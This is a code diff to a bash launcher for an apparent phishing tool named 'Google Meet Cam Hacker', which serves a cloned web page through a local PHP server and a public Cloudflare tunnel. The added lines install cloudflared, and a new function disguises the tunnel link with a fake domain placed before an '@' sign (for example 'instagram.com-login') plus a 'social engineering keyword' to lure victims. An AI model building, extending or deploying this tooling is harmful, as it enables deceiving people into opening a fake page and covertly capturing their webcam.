@@ -17,11 +17,41 @@ function banner() {
     echo -e "${RESET}"
 }
 
+function check_internet() {
+    echo -e "${CYAN}[i] Checking internet connection...${RESET}"
+    wget -q --spider https://google.com
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}[!] No internet connection. Exiting.${RESET}"
+        exit 1
+    fi
+}
+
+function check_cloudflared() {
+    if ! command -v cloudflared &> /dev/null; then
+        echo -e "${CYAN}[*] Cloudflared not found. Installing...${RESET}"
+        wget -O cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+        chmod +x cloudflared
+        sudo mv cloudflared /usr/local/bin/
+    fi
+}
+
 function start_php_server() {
     mkdir -p $SERVER_DIR
     cp -r $SITE_DIR/* $SERVER_DIR/
     cd $SERVER_DIR && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
     echo -e "${GREEN}[+] PHP server started at http://127.0.0.1:$PORT${RESET}"
+}
+
+function mask_url() {
+    echo -ne "${CYAN}[?] Do you want to change Mask URL? [y/N]: ${RESET}"
+    read choice
+    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
+        read -p "[+] Enter a custom domain to mask (e.g., https://instagram.com-login): " custom
+        read -p "[+] Enter a social engineering keyword (e.g., free-access): " keyword
+        echo -e "${GREEN}[+] Masked URL: $custom@$URL/$keyword${RESET}"
+    else
+        echo -e "${GREEN}[+] Direct URL: $URL${RESET}"
+    fi
 }
 
 function start_cloudflared() {
@@ -30,7 +60,7 @@ function start_cloudflared() {
     sleep 6
     URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ../cloudflared.log | head -n 1)
     if [[ $URL ]]; then
-        echo -e "${GREEN}[+] Public URL: $URL${RESET}"
+        mask_url
     else
         echo -e "${RED}[!] Failed to get Cloudflared URL. Make sure it's installed.${RESET}"
         exit 1
@@ -42,6 +72,9 @@ function start_cloudflared() {
 
 # Run launcher
 banner
+check_internet
+check_cloudflared
+
 echo -e "${CYAN}[1] Launch Google Meet Cam Hacker${RESET}"
 read -p $'Choose an option: ' opt
 
